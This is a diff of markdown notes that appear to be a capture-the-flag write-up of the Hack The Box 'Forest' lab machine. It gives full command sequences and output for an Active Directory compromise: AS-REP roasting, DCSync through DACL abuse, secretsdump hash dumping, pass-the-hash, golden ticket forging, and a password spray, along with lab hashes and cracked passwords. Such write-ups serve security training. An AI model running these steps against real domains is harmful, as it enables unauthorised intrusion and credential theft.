@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```
+```
 nmap -sV -sC -vv 10.10.10.161
 nmap -sU --top-ports=10 -vv 10.10.10.161
 
@@ -72,7 +72,7 @@ PORT     STATE         SERVICE      REASON
 ## SMB Enumeration
 - smbclient doesn't give any access
 - crackmapexec gives a hit on this command but gives an access denied on `--shares`
-	```
+```
 crackmapexec smb 10.10.10.161 -u '' -p ''
 crackmapexec smb 10.10.10.161 -u '' -p '' --shares
 
@@ -86,11 +86,11 @@ SMB         10.10.10.161    445    FOREST           [+] htb.local\:
 SMB         10.10.10.161    445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED
 
 ```
-	- Can't access shares
+- Can't access shares
 ## LDAPSearch
 - LDAP has anonymous authentication so we explore LDAP to enumerate:
 	- We find DC name (although we know from nmap)
-	```
+```
 ldapsearch -x -H ldap://10.10.10.161 -s base namingcontexts
 
 ---OUTPUT---
@@ -110,8 +110,8 @@ namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
 namingContexts: DC=DomainDnsZones,DC=htb,DC=local
 namingContexts: DC=ForestDnsZones,DC=htb,DC=local
 ```
-	- We grab the data:
-		```
+- We grab the data:
+```
 ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local"
 ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" > ldap
 cat ldap| grep "password"  
@@ -174,7 +174,7 @@ userPrincipalName: mark@htb.local
 ```
 - Tried some enumeration shown at the bottom
 	- main find (no longer working but shown at Ippsec...still good way to enumerate):
-		```
+```
 rpcclient -U '' 10.10.10.161
 > 
 > enumdomusers
@@ -182,9 +182,9 @@ rpcclient -U '' 10.10.10.161
 ---RELEVANT-OUTPUT---
 svc-alfresco
 ```
-		- We find an extra user from the users we found at ldapsearch
+- We find an extra user from the users we found at ldapsearch
 - finding user with no kerberos pre auth
-	```
+```
 impacket-GetNPUsers -dc-ip 10.10.10.161 -request 'htb.local/'
 
 ---OUTPUT---
@@ -203,7 +203,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:bbf235534c8c95a1a797c549f6906165$8bd169e1d3
 ```
 ## Bloodhound
 - We grab the files with our credentials
-	```
+```
 
 ```
 - ![Pasted image 20250419124256.png](../Attachments/Pasted%20image%2020250419124256.png)
@@ -212,7 +212,7 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:bbf235534c8c95a1a797c549f6906165$8bd169e1d3
 			- With this we can create and modify users and add them to non protected groups
 		- We also see EXCH01.HTB.LOCAL
 			- We check using nslookup:
-				```
+```
 nslookup
 > server 10.10.10.161
 > exch01.htb.local
@@ -226,28 +226,28 @@ Address: 10.10.10.7
 Name:   exch01.htb.local
 Address: dead:beef::9548:657:1098:7fdd
 ```
-			- We try to ping it but it fails
-			- This is probably a domain that used to exist and for that domain our user was given this Account Operator privileges.
-	- Using this we can create a new user (or escalate our current user but since it's HTB and other users might be using it's safer to just create a new user)
-		```
+- We try to ping it but it fails
+- This is probably a domain that used to exist and for that domain our user was given this Account Operator privileges.
+- Using this we can create a new user (or escalate our current user but since it's HTB and other users might be using it's safer to just create a new user)
+```
 net user rocknrj rocknrj /add
 net users # to check if user has been added
 ```
-- ![Pasted image 20250419140322.png](../Attachments/Pasted%20image%2020250419140322.png)
-	- Shortest path to domain admin
-		- here we see a group "Exchange Windows Permissions" which has write DACL privileges over HTB.LOCAL
-		- We can give our user DCsync privielges over it and then grab the Administrator's hash with secretsdump
+![Pasted image 20250419140322.png](../Attachments/Pasted%20image%2020250419140322.png)
+- Shortest path to domain admin
+	- here we see a group "Exchange Windows Permissions" which has write DACL privileges over HTB.LOCAL
+	- We can give our user DCsync privielges over it and then grab the Administrator's hash with secretsdump
 - To perform this we add our newly created user to the "Exchange Windows Permissions" group
-	```
+```
 net group "Exchange Windows Permissions"
 net group "Exchange Windows Permissions" rocknrj /add
 ```
 - Exploit DACL rights
-	```
+```
 impacket-dacledit -action write -rights DCSync -principal rocknrj -target-dn 'DC=htb,DC=local' htb.local/rocknrj:rocknrj
 ```
 - Grab hashes of users:
-	```
+```
 impacket-secretsdump htb.local/rocknrj:rocknrj@10.10.10.161
 
 ---OUTPUT---
@@ -281,12 +281,12 @@ krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
 ...
 
 ```
-	- We find the admin password hash:
-		```
+- We find the admin password hash:
+```
 aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
 ```
 - We can psexec or winrm to target
-	```
+```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
 
 --OR--
@@ -319,7 +319,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 htb\administrator
 ```
-	- We grab the root flag
+- We grab the root flag
 
 -------
 --------
@@ -327,7 +327,7 @@ htb\administrator
 - Ippsec video had a lot of extra content which I will add here
 ## Cracking all hashes
 - We attempt to crack all hashes
-	```
+```
 vi hashes # Copy hashes from secrets dump here
 cat hashes| grep ::: | awk -F: '{print $1":"$4}' > hashntlm
 hashcat -m 1000 --user hashntlm /usr/share/wordlists/rockyou.txt
@@ -348,12 +348,12 @@ htb.local\SM_1ffab36a2f5f479cb:31d6cfe0d16ae931b73c59d7e0c089c0:
 htb.local\svc-alfresco:9248997e4ef68ca2bb47ae4e6f128668:s3rvice
 htb.local\santi:483d4c70248510d8e0acb6066cd89072:plokmijnuhbe 
 ```
-	- 31d... is blank pwd
-	- Note that it won't work without `--user` flag as the hash file incudes `username:hash`
+- 31d... is blank pwd
+- Note that it won't work without `--user` flag as the hash file incudes `username:hash`
 ## Golden Ticket (Krbtgt)
 - Among the hashes we also have krbtgt hash.
 	- We can try to exploit Golden Ticket attack
-		```
+```
 whoami /user
 --OR--
 (Get-ADDomain).DomainSID
@@ -405,9 +405,9 @@ SubordinateReferences              : {DC=ForestDnsZones,DC=htb,DC=local, DC=Doma
 SystemsContainer                   : CN=System,DC=htb,DC=local
 UsersContainer                     : CN=Users,DC=htb,DC=local
 ```
-	- For output1, the 1147 is the identifier for user so the SID excludes that)
+- For output1, the 1147 is the identifier for user so the SID excludes that)
 - ticketer to grab ticket
-	```
+```
 impacket-ticketer -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local administrator
 
 ---OUTPUT---
@@ -427,15 +427,15 @@ datetimes in UTC: datetime.datetime.now(datetime.UTC).
 [*]     EncASRepPart
 [*] Saving ticket in administrator.ccache
 ```
-	- You could change the user to anything instead of administrator and it should work because we are creating our own ticket
-		- What happens is since its signed by the domain the machine won't check since if its signed by the domain it must be authorized and that's how we impersonate admin. the ticket is what matters not the username we set.
+- You could change the user to anything instead of administrator and it should work because we are creating our own ticket
+	- What happens is since its signed by the domain the machine won't check since if its signed by the domain it must be authorized and that's how we impersonate admin. the ticket is what matters not the username we set.
 - I also added forest and htb to /etc/hosts
 	- why? the spn name htb.local wasn't working.
 		- says something about the name not being found on the database
 			- maybe the database is on the remote server.
 			- The name of the box is forest so we add forest and htb (forest.htb) to /etc/hosts
 - Then we add the ccache to KRB5CCNAME and attempt to use psexec to login with kerberos auth (wmiexec doesnt work, because psexec doesn't alwasys impersonate the service)
-	```
+```
 export KRB5CCNAME=administrator.ccache
 impacket-psexec -k -no-pass htb.local/administrator@forest
 
@@ -458,14 +458,14 @@ nt authority\system
 C:\Windows\system32> 
 
 ```
-	- If we query user (and we enteredd a random user instead of admin during ticketer) it would respond with `No user exists for `\*\r\n` 
-		- we could not use IP Addresses anywhere in the command and need FQDN for the domain.  Create entries in Host file if DNS is not there.
+- If we query user (and we enteredd a random user instead of admin during ticketer) it would respond with `No user exists for `\*\r\n` 
+	- we could not use IP Addresses anywhere in the command and need FQDN for the domain.  Create entries in Host file if DNS is not there.
 ## Password List generation and LDAP queries
 - **LDAP Queries**
 	- In our LDAP search we used grep to find usernames. We can instead use queries in our LDAP search. 
 		- That's actually how ldapsearch is supposed to be used.
 			- You select the scope (DC=htb,DC=local) and target and then we query it to get an output
-				```
+```
 # Dump things only with Object Class "Person"
 ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=Person)'
 # Dump things only with Object Class "Organizational Person"
@@ -473,28 +473,28 @@ ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=organiza
 # Dump things only with Object Class "user"
 ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=user)'
 ```
-	- Can see when 
-		- users were created (FORMAT : YYYY-MM-DD-HH-MM-SS), 
-		- the object class
-		- Successful Login Count
-		- Bad Password Attempts
-		- Potential email addresses
-		- sAMAccountName (username) and sAMAccountType
-			- Search for all sAMAccountName and sAMAccountTyoe
-				```
+- Can see when 
+	- users were created (FORMAT : YYYY-MM-DD-HH-MM-SS), 
+	- the object class
+	- Successful Login Count
+	- Bad Password Attempts
+	- Potential email addresses
+	- sAMAccountName (username) and sAMAccountType
+		- Search for all sAMAccountName and sAMAccountTyoe
+```
 ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=user) sAMAccountName sAMAccountTyoe > ldapquery
 ```
-		- Password Last Set
-			- Windows has a different timestamp different from epoch
-				- Can read via (googled Windows timestamp to human):
-					- https://www.epochconverter.com/ldap
+- Password Last Set
+	- Windows has a different timestamp different from epoch
+		- Can read via (googled Windows timestamp to human):
+			- https://www.epochconverter.com/ldap
 - Since we want to do a Password Spray, to grab only the usernames:
-	```
+```
 ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" '(ObjectClass=Person)' sAMAccountName | grep sAMAccountName  
 # Object class can be user too as output is the same here
 ```
-	- Still need to remove the users we probably don't need (we remove machine accounts that have $ at the end as AD generates them themselves and so won't be able to crack passwords, and the accounts generated by exchange, as well as "Request" which isn't an account)
-		```
+- Still need to remove the users we probably don't need (we remove machine accounts that have $ at the end as AD generates them themselves and so won't be able to crack passwords, and the accounts generated by exchange, as well as "Request" which isn't an account)
+```
 cat ldapquery
 
 ---OUTPUT---
@@ -506,14 +506,14 @@ santi
 ```
 - **Making a password list**
 	- rockyou.txt is a huge files
-		```
+```
 wc -l /usr/share/wordlists/rockyou.txt 
 
 ---OUTPUT---
 14344392 /usr/share/wordlists/rockyou.txt
 ```
-	- To create a pwd list add a basic list to a file (usually all the months in the year, Seasons, domain name, password itself, the year)
-		```
+- To create a pwd list add a basic list to a file (usually all the months in the year, Seasons, domain name, password itself, the year)
+```
 cat pwdlist
 
 ---OUTPUT---
@@ -539,120 +539,120 @@ Forest
 htb
 Secret
 ```
-	- We have about 21 passwords (`wc -l <filename>`)
+- We have about 21 passwords (`wc -l <filename>`)
 - Then we add the year to the end of these words
-	```
+```
 for i in $(cat pwdlist); do echo $i; echo ${i}2019; echo ${i}2020; done > pwdlistyear
 ```
-	- If you want to add it to the same file do note:
-		- If you cat a file an then direct the output to the top of the same file it will **erase** the entire file (Not replace but erase i.e file ill be blank)
-			- So inorder to do this you would need to copy it to another file and then move that file to our file i.e
-				```
+- If you want to add it to the same file do note:
+	- If you cat a file an then direct the output to the top of the same file it will **erase** the entire file (Not replace but erase i.e file ill be blank)
+		- So inorder to do this you would need to copy it to another file and then move that file to our file i.e
+```
 for i in $(cat pwdlist); do echo $i; echo ${i}2019; echo ${i}2020; done > t
 cp t pwdlist
 ```
-				- Now we have 57 pwds
+- Now we have 57 pwds
 - Then to mutate our list with hashcat to create a variety from this list
-	```
+```
 hashcat --force --stdoout pwdlistyear -r /usr/share/hashcatrules/best64.rule
 ```
-	- It's missing the ! character
-		```
+- It's missing the ! character
+```
 # To check
 hashcat --force --stdoout pwdlistyear -r /usr/share/hashcatrules/best64.rule | grep '\!'
 hashcat --force --stdoout pwdlistyear -r /usr/share/hashcatrules/best64.rule | grep '!'
 ```
-		- No output showing no ! included
+- No output showing no ! included
 - We add ! to our list:
-	```
+```
 for i in $(cat pwdlistyear); do echo $i; echo ${i}!; done > pwdspecial
 ```
-	- Then we pass the hashcat command
-		```
+- Then we pass the hashcat command
+```
 hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule | wc -l 
 
 ---OUTPUT---
 8778
 ```
-		- 8778 pwd
+- 8778 pwd
 - We can then toggle various upper cases with toggle1 rule:
-	```
+```
 hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule
 ```
-	- Can check pwd list number:
-		```
+- Can check pwd list number:
+```
 hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | wc -l
 
 ---OUTPUT---
 131670
 ```
-		- Whenever we do toggles, or we have multiple rules (maybe some of the rules in toggles1 is in best64 already), we will have duplicates so we need to sort them:
-			```
+- Whenever we do toggles, or we have multiple rules (maybe some of the rules in toggles1 is in best64 already), we will have duplicates so we need to sort them:
+```
 hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | wc -l
 
 ---OUTPTU---
 45207
 ```
-			- Lot of passwords
+- Lot of passwords
 - Let's keep a minimum character limit (8 or above):
-	```
+```
 hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0)>8' | wc -l
 
 ---OUTPUT---
 30151
 ```
 - Pipe it to a file
-	```
+```
 hashcat --force --stdout pwdspecial -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule | sort -u | awk 'length($0)>8' > finallist
 ```
 - Before any brute force you should check password policy so we don't lock an account out (as it could be a potential access point)
 	- Can use enum4linux (not updated in a long time so not the best option)
-		```
+```
 enum4linux 10.10.10.162
 ```
-		- Does give more info here ( for password policy)
-		- Uses polenum command
+- Does give more info here ( for password policy)
+- Uses polenum command
 	- Can use crackmapexec:
-		```
+```
 crackmapexec smb 10.10.10.161 --pas-pol -u '' -p ''
 ```
-		- If threshold is 0, no policy set
-		- Null authentication will generally work on a lot of domains that have been upgraded from 2003.
-			- When you install a domain now, it doesn't let null authentication because back in 2003 anonymous users had this privileges
-				- Also why enum4linux is working
-				- because you may require the functionality so they don't remove it for compatibility when you upgrade (when you upgrade from 2003 to 2008 etc)
-					- Anonymous users is in the pre windows 2000 compatibility group
-						- If you remove that, it will fix this
+- If threshold is 0, no policy set
+- Null authentication will generally work on a lot of domains that have been upgraded from 2003.
+	- When you install a domain now, it doesn't let null authentication because back in 2003 anonymous users had this privileges
+		- Also why enum4linux is working
+		- because you may require the functionality so they don't remove it for compatibility when you upgrade (when you upgrade from 2003 to 2008 etc)
+			- Anonymous users is in the pre windows 2000 compatibility group
+				- If you remove that, it will fix this
 - Another note, in rpcclient too if you do:
-	```
+```
 rpcclient 10.10.10.161 
 ```
-	- It will fail, but you can specify:
-		```
+- It will fail, but you can specify:
+```
 rpcclient -U '' 10.10.10.161
 >
 ```
-		- It will work
-	- If you do enumdomusers here, you will get a list of usernames
-		- We find another use which we didn't find in ldapsearch here "svc-alfresco"
-			```
+- It will work
+- If you do enumdomusers here, you will get a list of usernames
+	- We find another use which we didn't find in ldapsearch here "svc-alfresco"
+```
 > enumdomusers
 > queryusergroups [rid-id] # to see groups user is in and we find 2
 > querygroup [rid-id] # Shows domain users and service Account
 > queryuser [rid-id] # shows last login, pwd last set, when pwd will change
 ```
-			- We add it to our user list (make sure to use `>>` and not `>` as the latter will replace the file contents with simply `svc-alfresco` while the former will add it to the bottom of the list)
-				```
+- We add it to our user list (make sure to use `>>` and not `>` as the latter will replace the file contents with simply `svc-alfresco` while the former will add it to the bottom of the list)
+```
 echo "svc-alfresco" >> ldapquery # although no longer ldap query since we added this user, so better to save as another file
 ```
-				- Why not shown in ldap? maybe anonymous user doesn't have access to this service account user data
+- Why not shown in ldap? maybe anonymous user doesn't have access to this service account user data
 - Finally we run our brute force in the background while we do other enumeration:
-	```
+```
 crackmapexeec smb 10.10.10.161 -u userlist -p finallist
 ```
 
 ## BloodHound rabbit holes
-- ![Pasted image 20250419122908.png](../Attachments/Pasted%20image%2020250419122908.png)
+![Pasted image 20250419122908.png](../Attachments/Pasted%20image%2020250419122908.png)
 	- Shortest Path from Owned Principles to Domain Admins
 - ![Pasted image 20250419123040.png](../Attachments/Pasted%20image%2020250419123040.png)
 	- Path from svc-alfresco to administrator
